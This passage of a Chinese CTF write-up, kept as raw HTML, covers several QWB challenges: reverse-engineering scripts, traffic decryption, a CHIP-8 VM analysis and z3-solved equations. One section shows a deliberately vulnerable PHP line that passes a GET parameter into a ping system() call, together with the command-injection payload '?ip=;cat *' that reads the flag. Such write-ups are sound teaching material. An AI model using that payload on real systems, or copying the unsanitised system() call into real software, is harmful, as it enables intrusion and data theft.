    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;no flag&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;ping -c 3 <span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>ip<span class="token punctuation">]</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>直接<code>/?ip=;cat%20*</code>，得到 flag</p> <h2 id="侧防"><a href="#侧防" class="header-anchor">#</a> 侧防</h2> <p>纯粹的一道逆向，没有壳，没有混淆……</p> <p>算法是先常量表异或再加<code>'A'</code>，最后每 4 字节为一块循环右移。写脚本出 flag（的绝大部分）：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>

tbl_encrypt <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x73</span> <span class="token punctuation">]</span>

target <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span>
    <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span>
    <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    target_0 <span class="token operator">=</span> target<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">]</span>
    target<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> target<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>
    target<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> target<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span>
    target<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> target<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span>
    target<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> target_0

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    target<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>target<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>
    target<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>target<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> tbl_encrypt<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
<span class="token comment">#print(target.decode())</span>

<span class="token comment"># bytearray(b'flag{QWB_water_problem_give_you_the_scor\xd8\xcc\xee\xe8')</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>flag 最后坏掉了但是不知道怎么修……从 flag 内容猜测得到完整 flag：<code>flag{QWB_water_problem_give_you_the_score}</code></p> <h2 id="红方辅助"><a href="#红方辅助" class="header-anchor">#</a> 红方辅助</h2> <p>对比流量包中数据和<code>client.py</code>的流程，可以识别并提取所有发送出去的数据。写脚本解密之：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> struct

funcs <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">b'0'</span> <span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> x <span class="token operator">-</span> y<span class="token punctuation">,</span>
    <span class="token string">b'1'</span> <span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> x <span class="token operator">+</span> y<span class="token punctuation">,</span>
    <span class="token string">b'2'</span> <span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> x <span class="token operator">^</span> y
<span class="token punctuation">}</span>

funcs_inv <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">b'0'</span> <span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> x <span class="token operator">+</span> y<span class="token punctuation">,</span>
    <span class="token string">b'1'</span> <span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> x <span class="token operator">-</span> y<span class="token punctuation">,</span>
    <span class="token string">b'2'</span> <span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> x <span class="token operator">^</span> y
<span class="token punctuation">}</span>

offset <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">b'0'</span> <span class="token punctuation">:</span> <span class="token number">0xefffff</span><span class="token punctuation">,</span>
    <span class="token string">b'1'</span> <span class="token punctuation">:</span> <span class="token number">0xefffff</span><span class="token punctuation">,</span>
    <span class="token string">b'2'</span> <span class="token punctuation">:</span> <span class="token number">0xffffff</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
dec_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
idx <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> idx
    <span class="token keyword">if</span> idx <span class="token operator">&gt;=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">b''</span>
    idx <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">return</span> data<span class="token punctuation">[</span>idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>btime<span class="token punctuation">,</span> boffset<span class="token punctuation">,</span> enc_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    count<span class="token punctuation">,</span> length<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> salt <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'&lt;IIcB'</span><span class="token punctuation">,</span> enc_data<span class="token punctuation">[</span> <span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    enc <span class="token operator">=</span> enc_data<span class="token punctuation">[</span><span class="token number">10</span> <span class="token punctuation">:</span> <span class="token punctuation">]</span>
    dec <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    t <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>btime <span class="token operator">+</span> offset<span class="token punctuation">[</span>fn<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length <span class="token operator">-</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        dec<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>funcs_inv<span class="token punctuation">[</span>fn<span class="token punctuation">]</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> salt<span class="token punctuation">)</span> <span class="token operator">^</span> t<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> dec

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.log'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span>

client_req <span class="token operator">=</span> get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> client_req <span class="token operator">==</span> <span class="token string">b'G'</span><span class="token punctuation">:</span>
    btime <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span>
    boffset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span>
    enc_data <span class="token operator">=</span> get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>
    pcount <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'pcount = %d, idx = %d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pcount<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        dec_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>btime<span class="token punctuation">,</span> boffset<span class="token punctuation">,</span> enc_data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        dec_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'--- decrypt error: %s ---\n'</span> <span class="token operator">%</span> e<span class="token punctuation">)</span>
    client_req <span class="token operator">=</span> get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#print('\n'.join(dec_data))</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.log'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>dec_data<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br></div></div><p>输出的文件当中夹杂大量不可打印字符。将所有不可打印字符均替换成问号，再替换清理“颜色”过深的背景字符，得到一幅字符画：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>[ --- 截断 --- ]
.........................................................................................................................
.........................................................................................................................
.........................................................................................................................
..........................................................NQQo?..........................................................
.........................................................d0??YX?\........................................................
..............................................................=?n........................................................
............................................................?8X\.........................................................
.............................................................`X?\........................................................
........................................................Q.....8?n........................................................
,...,...,...,...,...,...,...,...,...,...,...,...,...,...b8?Z:80?,...,...,...,...,...,...,...,...,...,...,...,...,...,...,
,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,
,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,
,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,
[ --- 截断 --- ]
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>选一种合适的等宽字体，调小字号，读出 flag 核心：<code>3e752bf509ddb4e9a42f1ef30beff495</code>。挨个试 flag 外壳，试到<code>QWB{3e752bf509ddb4e9a42f1ef30beff495}</code>提交成功。</p> <h2 id="问卷调查"><a href="#问卷调查" class="header-anchor">#</a> 问卷调查</h2> <p>emmm 填完问卷就出来了，但是忘了备份 flag……</p> <h2 id="imitation-game"><a href="#imitation-game" class="header-anchor">#</a> imitation_game</h2> <h3 id="程序逻辑"><a href="#程序逻辑" class="header-anchor">#</a> 程序逻辑</h3> <p>程序判断 argc 为 2，否则退出</p> <p>程序 fork，然后主进程显示 flag 信息，等待子进程结束</p> <p>子进程：</p> <ol><li>子进程读取 0x20 输入，从数据段取 aes 密钥、padding（0x1a）、iv</li> <li>子进程将属于的 flag 加上 padding 做 aes-128 cbc 加密</li> <li>子进程判断加密结果和 0x50A0 数据是否相同，然后通过执行不同的机器码，向主进程返回信息</li></ol> <p>父进程： 父进程是 chip8 模拟器</p> <ol><li>父进程通过 wait 接收子进程的返回值，如果子进程失败父进程直接退出不做剩下的步骤</li> <li>父进程之后的循环是以 0x8120 为 ip，0x8980 为代码的 vm</li> <li>vm 内外代码的对应通过.data.rel.ro实现</li> <li>main 函数剩下的部分主要是 SDL 显示和其他的一些与题目无关的操作</li></ol> <p>vm 里的逻辑：</p> <ul><li>vm 代码主要包括以下几个函数：(按照先后顺序)</li></ul> <ol><li>显示 DEAD</li> <li>将 v0v1 两个参数相乘，返回乘积</li> <li>主要验证逻辑：这部分再划分三部分</li></ol> <ul><li><ol><li>读取、存储（在 v0-v9 寄存器）、显示 （十个）按键</li></ol></li> <li><ol start="2"><li>对 flag 的各字符进行一些加、减、异或的处理再放回原位</li></ol></li> <li><ol start="3"><li>将 flag 连续三字符乘上特定常数求和做比较</li></ol></li> <li><ol start="4"><li>比较第十个按键是否是 3</li></ol></li></ul> <h3 id="解题过程"><a href="#解题过程" class="header-anchor">#</a> 解题过程</h3> <p>粗略浏览程序逻辑，判断子进程先执行，所以先查看子进程</p> <ul><li>发现 ptrce0000，patch 掉，可以调试</li> <li>从常数矩阵 0x8020 和函数 0x47f0 逻辑推测是 aes 算法，根据 aes 算法的结构，判断 0x5100 0x5120 分别是 aes key/iv</li> <li>判断程序的 aes s 盒和标准 s 盒不同，复制 s 盒到其他 aes 实现，尝试加密，发现和本程序加密的结果不一样</li> <li>动调获取程序生成的 aes 轮密钥矩阵替换其他 aes 实现的轮密钥，尝试加密，发现不一样</li> <li>动调发现程序 s 盒和标准 aess 盒相同，猜测程序存在对 s 盒的修改，<s>懒得去找</s></li> <li>使用动调获得的轮密钥盒标准的 aes 逆 s 盒解密 0x50A0 获得前半段 flag</li></ul> <p>子进程通过特殊的方法向父进程返回了验证结果，但是不重要不影响做题，接下来看父进程。</p> <ul><li>分析父进程的逻辑，发现大部分是在做 SDL 显示和一些其他的杂活，找了半天，跟 SDL 的文档较劲一下午，最后发现程序是个 vm</li> <li>逐条分析 vm 的指令作用……这时放了提示 chip8，寻找对应 vm 的反编译器，将反编译器代码与对 vm 的分析比较，判断题目修改了两种 vm 代码，修复之后反编译成功。</li> <li>研究分析反编译结果，vm 中有 16 个通用寄存器、一个共用的字库、数据、代码存储，vm 只有调用栈，本程序中用 VE(作为栈指针)和字库构成了程序的数据栈，调用方压栈，被调方清栈，参数从 v0 开始存放，返回值放于 VF。</li> <li>分析发现 vm 里的操作不算特别复杂，是简单的算术和三组参数一样的方程组，简单计算之后得到了 flag</li></ul> <h2 id="xx-warmup-obf"><a href="#xx-warmup-obf" class="header-anchor">#</a> xx_warmup_obf</h2> <h3 id="程序逻辑-2"><a href="#程序逻辑-2" class="header-anchor">#</a> 程序逻辑</h3> <p>没太看明白，不过姑且应该是什么混淆器吧，还通过读写数据来骗各种反汇编、反编译器；程序使用了一个 jmp rbx 函数替代 call；但是通过找函数的引用能粗略的判断函数的逻辑：</p> <ul><li>显示提示信息</li> <li>读取 flag</li> <li>在 flag 中寻找'\n'</li> <li>判断 flag 长度 28</li> <li>显示 flag 长度不对</li> <li>判断 flag 内容</li> <li>显示 flag 内容是否正确</li></ul> <h3 id="做题过程"><a href="#做题过程" class="header-anchor">#</a> 做题过程</h3> <p>打眼一看程序使用了很复杂的混淆手段，同时程序中还大量出现 int 3 断点干扰调试。
程序在 init_array（main 函数开始执行前执行的函数数组）中注册了信号 5 SIGTRAP 的处理函数，并写入了一些数据。</p> <p>既不认识混淆的方法又对硬看没啥想法，所以随便翻翻，程序混淆的一个特征是大量的跳转和不正常指令，翻代码的时候突然发现一大段不带跳转的内容，于是仔细看了看。</p> <p>发现一些结构类似，包含 imul 指令的代码段，向上寻找，发现类似结构最小包含一个 imul，结果与常数做了比较，解出来发现是‘f’，接着，看四个 imul 的结构，发现是‘flag’，大喜，通过 ghidra 来反编译方程，获得若干方程。</p> <p>整理方程的格式为可以试用 z3 求解的形式，解得 flag。（实际上方程是未知数个数从 1 到 28 逐渐增加，可以逐个方程求解）</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>f=102
f1=108
f2=97
f3=103
solve(((f1) * -0xebc1 + (f4) * -0x37b78 + f * 0x17201 + (f3) * -0x43089 + (f2) * 0x45b88 == -0x1853445))
solve( ((f1) * -0xebc1 + (f4) * -0x37b78 + f * 0x17201 + (f3) * -0x43089 + (f2) * 0x45b88 == -0x1853445))
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.1eac7796.js" defer></script><script src="/assets/js/2.da4aa226.js" defer></script><script src="/assets/js/31.6a66925e.js" defer></script>
  </body>
</html>
